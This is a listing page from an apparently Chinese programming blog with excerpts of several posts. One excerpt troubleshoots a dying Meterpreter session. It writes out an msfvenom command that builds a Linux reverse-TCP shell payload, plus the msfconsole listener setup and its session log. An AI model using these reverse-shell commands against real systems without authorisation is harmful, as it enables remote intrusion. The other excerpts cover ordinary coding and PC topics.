		<a class="list__footer-readmore btn" href="/posts/7177567b99a188ff5aa9f2df6e3812eb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7223cff8732646f7d7f30d92e090d54b/" rel="bookmark">
			Meterpreter session 2 closed. Reason: Died 问题解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述
用msf生成Ubuntu 16.04的反向连接木马：
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.16.252.129 LPORT=1234 -f elf &gt; shell.elf
开启监听：
msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 172.16.252.129 set lport 1234 exploit 另一端靶机上运行shell后显示段错误：
./shell.elf Segmentation fault (core dumped)
msf攻击机上显示连接session关闭：
[*] Started reverse TCP handler on 172.16.252.129:1235 [*] Sending stage (180291 bytes) to 172.16.252.138
[*] Meterpreter session 2 opened (172.16.252.129:1235 -&gt; 172.16.252.138:55946) at 2020-04-21 21:42:43 -0400
[*] 172.16.252.138 - Meterpreter session 2 closed. Reason: Died
反复连接，反复出错，只见session数一直增加：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7223cff8732646f7d7f30d92e090d54b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c8b9ac0caaa5cdd00f3e90e0d2ca9e0/" rel="bookmark">
			删除字符串最后一个字符
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		//删除str最后一个字符 str=str.substring(0, str.length()-1); string.substring(a); a之后的，包括a。
string.substring(a,b);包括a，不包括b。
需校验非空，左闭右开，以0开始。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b9e65958929ea4a2997900391a1bc12/" rel="bookmark">
			微信小程序跳转到第三方小程序指定页面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 之前的小程序里有几个外链的需求，一开始想用web-view实现，后来发现web-view如果要获得第三方的授权几乎不可能，至少对应域名的服务器我是碰不到…
但是加入第三方小程序是不需要这么多要求的，再设置一下跳转小程序的路径，就可以实现跳转到我们想要的具体页面。
wxml代码：
target设置为miniProgram，app-id设置成要跳转的小程序app-id，path是要跳转的小程序的具体页面，open-type为跳转方式。下文会介绍如何获取第三方小程序的app-id和path。
ps：这里有个坑！复制后的路径中带有的html后缀要去掉！不然页面会找不见。
官方文档写的也比较清楚：
navigator
获取app-id：
这个比较简单，在小程序的更多里就可以找到
获取页面path：
小程序后台
1.点击小程序管理后台右上角的生成小程序码
2.查找要获取页面路径的小程序，可以输入APPID/名称/账号原始ID
3.鼠标移到获取更多页面路径，跟流程走就可以了，开启入口后，手机端被开启入口的用户就可以通过小程序右上角的更多复制路径了。
app.json也要写上要跳转小程序的app-id。
"navigateToMiniProgramAppIdList": [ "wx0e6ed4f51db9d078", "wx9f77d65eb4eff65b" ] 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8d3ec17fd8ed0fe1af5f053ef952745/" rel="bookmark">
			OpenStreetMap (OSM)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 6. OpnStreetMap(OSM) 地图界的维基百科之称的OpenStreetMap（OSM）为我们打开了一扇通往新世界的大门，包含了丰富的地理数据，给予了地理、规划以及对空间句法、空间分析、空间规划感兴趣的人提供了许多便利。
OSM中包含的内容可以根据其公布的分类体系略知一二。OSM全称为OpenStreetMap，是在2004年7月由史蒂夫·克斯特始创。2006年4月，OpenStreetMap基金会成立，鼓励自由地理数据的增长，发展和分布，并向所有人提供地理数据以供使用及分享。
使用知多少？ https://zhuanlan.zhihu.com/p/93239773https://zhuanlan.zhihu.com/p/25889246http://www.360doc.com/content/16/0907/11/13792507_589028029.shtmlhttps://www.osgeo.cn/post/197b2 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc89056a6d96fa8f361915cdf7a6c3d2/" rel="bookmark">
			组装台式计算机型号怎么看,电脑配置怎么看,详细教您怎么查看电脑配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		很多人购买电脑都会问店员电脑配置是怎样的，都要检查硬件是否符合要求，避免不必要的麻烦，虽然事先了解是很好的，但是电脑组装起来也是非常容易的，谁知道会不会被掉包一个重要零件呢？那么怎么查看电脑配置？下面，小编就来跟大家聊聊查看电脑配置的操作了。
电脑配置一般CPU、显卡、主板、内存、硬盘、显示器等等，一般台式电脑对电脑配置的要求要高一些，相信很多男生打游戏也比较在乎配置，那你对你电脑的配置了解多少呢？可能连查看都不知道该怎么操作吧，下面，小编就来跟大家介绍查看电脑配置的操作方法。
怎么查看电脑配置
方法一：通过计算机属性查看电脑配置
在系统桌面上右键点击”我的电脑”(这台电脑/计算机)，选择“属性”
查看配置电脑图解-1
在系统属性可以查看“处理器”和“安装内存”两个信息，以及安装系统的版本和位数，如果要看显卡，则点击左上角“设备管理器”
电脑电脑图解-2
展开“处理器”和“显示适配器”，查看处理器几核心、频率和显卡的型号信息。
查看配置电脑图解-3
方法二：自带DirectX诊断工具查询电脑配置
按下Win+R组合键打开运行对话框
查看电脑配置电脑图解-4
在运行输入框中输入dxdiag，确定，打开DirectX诊断工具
查看电脑配置电脑图解-5
在“系统”选项卡中查看处理器参数、内存容量、BIOS版本和DirectX版本
电脑配置电脑图解-6
在“显示”选项卡中查看“显卡”的型号和参数信息。
查看电脑配置电脑图解-7
方法三：硬件检测工具查询硬件配置信息
第三方的硬件检测工具，比如电脑管家、360硬件大师、鲁大师等；
这边使用鲁大师为例，点击“硬件检测”，即可查询电脑各个硬件的详细信息
查看配置电脑图解-8
如果要查看某个硬件的信息，只需点击左侧栏目的项，比如主板信息、显示器信息、处理器信息、硬盘信息、显卡信息等等。
以上就是查看电脑配置的操作方法。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/305/">«</a>
	<span class="pagination__item pagination__item--current">306/489</span>
	<a class="pagination__item pagination__item--next btn" href="/page/307/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>